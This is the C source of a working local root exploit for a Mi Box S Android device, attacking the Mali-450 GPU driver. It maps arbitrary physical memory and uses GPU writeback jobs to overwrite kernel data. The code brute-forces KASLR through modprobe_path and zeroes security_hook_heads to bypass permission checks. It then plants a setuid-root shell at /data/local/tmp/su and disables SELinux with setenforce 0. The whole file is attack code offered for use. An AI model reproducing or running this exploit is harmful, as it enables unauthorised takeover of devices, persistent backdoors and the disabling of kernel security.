/*
 * kort_root3.c - Mi Box S (oneday) Mali-450 r10p1 提权 (KASLR 版)
 *
 * 1. KASLR 扫描: BIND modprobe_path 候选物理页 + WB 写 "////" magic
 *    -> 读 /proc/sys/kernel/modprobe 检测命中 (slide 2MB 步进)
 * 2. 命中后: BIND security_hook_heads 页, 4 个 1KB 窗口清零
 *    -> capable() 恒放行 -> setuid(0) = root
 * 3. 恢复 modprobe_path 原值 "/sbin/modprobe"
 *
 * 地址 (slide=0 基准):
 *   modprobe_path        PA 0x027DF960 (页 0x027DF000, 页内 0x960)
 *   security_hook_heads  PA 0x02828120 (页 0x02828000, 页内 0x120)
 *   PA = 0x01080000 + (VA - 0xffffff8009080000) + slide
 *
 * 编译: armv7a-linux-androideabi24-clang kort_root3.c -o kort_root3 -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_MEM_ALLOC  0xC0288300
#define MALI_IOC_MEM_BIND   0xC0288302
#define MALI_IOC_PP_START_JOB       0xC1988400
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize;
    uint32_t psize; uint32_t flags;
    uint64_t backend_handle; int32_t secure_shared_fd;
} alloc_mem_s;

typedef struct { uint32_t points[3]; int32_t sync_fd; } mali_uk_fence_t;

typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12];
    uint32_t wb2_registers[12]; uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} pp_start_job_s;

typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR      1
#define FR_FLAGS            3
#define FR_CLEAR_DEPTH      4
#define FR_CLEAR_STENCIL    5
#define FR_CLEAR_COLOR_0    6
#define FR_CLEAR_COLOR_1    7
#define FR_CLEAR_COLOR_2    8
#define FR_CLEAR_COLOR_3    9
#define FR_WIDTH           10
#define FR_HEIGHT          11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA           18
#define FR_SCALE           21
#define FR_FOUREIGHT       22

#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_PITCH 5
#define WB_MRT_BITS 6

#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY 0x800

#define GPU_VA_DATA  0x40000000u
#define GPU_VA_PROBE_BASE 0x41000000u   /* 扫描 BIND 区 (每 slide 一页) */
#define BUF_SIZE     0x4000

/* slide=0 基准地址 */
#define MODPROBE_PA_BASE   0x027DF000u  /* modprobe_path 页 */
#define MODPROBE_PAGE_OFF  0x960
#define HOOKS_PA_BASE      0x02828000u  /* security_hook_heads 页 */
#define HOOKS_PAGE_OFF     0x120

#define SLIDE_STEP   0x200000u          /* 2MB 对齐 */
#define SLIDE_MAX    0x40000000u        /* 扫描至 1GB */

static const uint32_t fragment_shader[] = {
    0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
};

static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }

static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    /* _mali_uk_bind_mem_s (r9p0/r10p1 权威布局):
       ctx@0(u64) vaddr@8 size@12 flags@16 padding@20
       union bind_ext_memory: phys_addr@24 rights@28 flags@32  -> 40 字节 */
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size,
             fl = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY,
             pa = phys, rights = 0x37;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 24, &pa, 4);      /* phys_addr 在 @24, 不是 @20! */
    memcpy(raw + 28, &rights, 4);  /* rights=0x37 RWX+cache */
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

/* WB job: 1KB 窗口 [wb_addr, wb_addr+0x400) 全写 value (实测验证) */
static int wb_write(int fd, uint32_t *buf, uint32_t wb_addr, uint32_t value)
{
    const uint32_t OFF_PLB = 0x000, OFF_SHADER = 0x080, OFF_RSW = 0x100,
                   OFF_TILEBLK = 0x200, OFF_STACK = 0x1000;
    memset(buf, 0, 0x2000);

    memcpy((uint8_t*)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));

    uint32_t *rsw = (uint32_t*)((uint8_t*)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
    rsw[0x0D] = 0x00000100;

    uint32_t *plb = (uint32_t*)buf;
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | (((GPU_VA_DATA + OFF_TILEBLK) >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000;
    plb[4] = 0x00000000;
    plb[5] = 0xBC000000;

    pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xCAFEBABE;
    job.num_cores = 1;

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + OFF_PLB;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + OFF_RSW;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = 0x100;
    job.frame_registers[FR_HEIGHT]          = 0x100;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
    job.frame_registers[FR_DUBYA]           = 0x77;
    job.frame_registers[FR_SCALE]           = 0x0C;
    job.frame_registers[FR_FOUREIGHT]       = 0x8888;

    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_PITCH]        = 8;
    job.wb0_registers[WB_MRT_BITS]     = 4;

    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;

    __builtin___clear_cache((char*)buf, (char*)buf + 0x2000);

    int r = tio(fd, MALI_IOC_PP_START_JOB, &job, 5);
    if (r != 0) return r;

    wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    r = tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5);
    return r;
}

/* 读 /proc/sys/kernel/modprobe 前 8 字节 */
static int read_modprobe(char *out, int n) {
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0) return -1;
    int r = read(fd, out, n - 1);
    close(fd);
    if (r <= 0) return -1;
    out[r] = 0;
    return 0;
}

int main(int argc, char **argv) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] kort_root3 - KASLR scan + hook clear + setuid(0)\n");
    printf("[*] uid=%d\n", getuid());

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("[-] open /dev/mali"); return 1; }

    alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE;
    alloc.psize = BUF_SIZE;
    if (tio(fd, MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) {
        printf("[-] ALLOC failed\n"); return 1;
    }
    void *buf = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { printf("[-] mmap\n"); return 1; }

    /* ---------- 阶段 1: KASLR 扫描 ---------- */
    char orig[32];
    read_modprobe(orig, sizeof(orig));
    printf("[*] modprobe now: %s\n", orig);

    uint32_t slide = 0;
    int found = 0;
    const uint32_t MAGIC = 0x2F2F2F2Fu;  /* "////" */

    printf("[*] scanning KASLR slide (step 2MB, max 1GB)...\n");
    for (uint32_t s = 0; s <= SLIDE_MAX; s += SLIDE_STEP) {
        uint32_t pa = MODPROBE_PA_BASE + s;
        uint32_t va = GPU_VA_PROBE_BASE + (s / SLIDE_STEP) * 0x1000;
        if (bind_phys(fd, pa, va, 0x1000) != 0) continue;
        if (wb_write(fd, (uint32_t*)buf, va + MODPROBE_PAGE_OFF, MAGIC) != 0) continue;

        char cur[32];
        if (read_modprobe(cur, sizeof(cur)) == 0 &&
            memcmp(cur, "////", 4) == 0) {
            slide = s;
            found = 1;
            printf("[+] FOUND slide=0x%08x (PA modprobe=0x%08x)\n",
                   slide, MODPROBE_PA_BASE + slide);
            break;
        }
        if ((s / SLIDE_STEP) % 64 == 0)
            printf("  [*] scanned to 0x%08x...\n", s);
    }

    if (!found) {
        printf("[-] scan failed: BIND-page WB write may not work, "
               "or slide > 1GB\n");
        return 1;
    }

    /* ---------- 阶段 2: 恢复 modprobe_path ---------- */
    /* 探针已写坏 modprobe_path 及其后 1KB, 用 4 个正向窗口恢复前缀
       (最终 [modprobe, +0x10) = "/sbin/modprobe\0") */
    {
        uint32_t va = GPU_VA_PROBE_BASE + (slide / SLIDE_STEP) * 0x1000;
        static const uint32_t dwords[4] = {
            0x6962732f,  /* "/sbi" */
            0x6f6d2f6e,  /* "n/mo" */
            0x6f727064,  /* "dpro" */
            0x00006562,  /* "be\0\0" */
        };
        printf("[*] restoring modprobe_path...\n");
        for (int i = 0; i < 4; i++)
            wb_write(fd, (uint32_t*)buf, va + MODPROBE_PAGE_OFF + 4 * i, dwords[i]);
        char cur[32];
        read_modprobe(cur, sizeof(cur));
        printf("[*] modprobe now: %s\n", cur);
    }

    /* ---------- 阶段 3: 清零 security_hook_heads ---------- */
    printf("[*] clearing security_hook_heads @ PA 0x%08x...\n",
           HOOKS_PA_BASE + slide);
    {
        /* 新 GPU VA 绑 hook 页 (2 页) */
        uint32_t hook_va = 0x42000000u;
        if (bind_phys(fd, HOOKS_PA_BASE + slide, hook_va, 0x2000) != 0) {
            printf("[-] BIND hooks failed\n"); return 1;
        }
        /* 正向 4 窗口: 最终 [0x120, 0xd20) 全 0 */
        const uint32_t offs[4] = { 0x120, 0x420, 0x720, 0x920 };
        for (int i = 0; i < 4; i++) {
            printf("[*] WB job %d/4: clear [0x%03x, 0x%03x)\n",
                   i + 1, offs[i], offs[i] + 0x400);
            int r = wb_write(fd, (uint32_t*)buf, hook_va + offs[i], 0);
            if (r == -999) { printf("[-] TIMEOUT\n"); return 1; }
        }
    }

    munmap(buf, BUF_SIZE);
    close(fd);

    /* ---------- 阶段 4: setuid(0) ---------- */
    printf("[*] trying setuid(0)...\n");
    if (setuid(0) != 0) {
        setgid(0);
        setuid(0);
    }
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    if (getuid() != 0) {
        printf("[-] setuid failed\n");
        return 1;
    }

    printf("\n[+] ========================================\n");
    printf("[+]  ROOT! uid=0\n");
    printf("[+] ========================================\n\n");

    system("id > /data/local/tmp/pwned.txt;"
           "echo PWNED >> /data/local/tmp/pwned.txt;"
           "cp /system/bin/sh /data/local/tmp/su;"
           "chown 0:0 /data/local/tmp/su;"
           "chmod 6755 /data/local/tmp/su;"
           "setenforce 0 2>/dev/null; true");

    if (argc > 1 && strcmp(argv[1], "-s") == 0) {
        char *sh[] = {"/system/bin/sh", NULL};
        execv(sh[0], sh);
    }
    return 0;
}
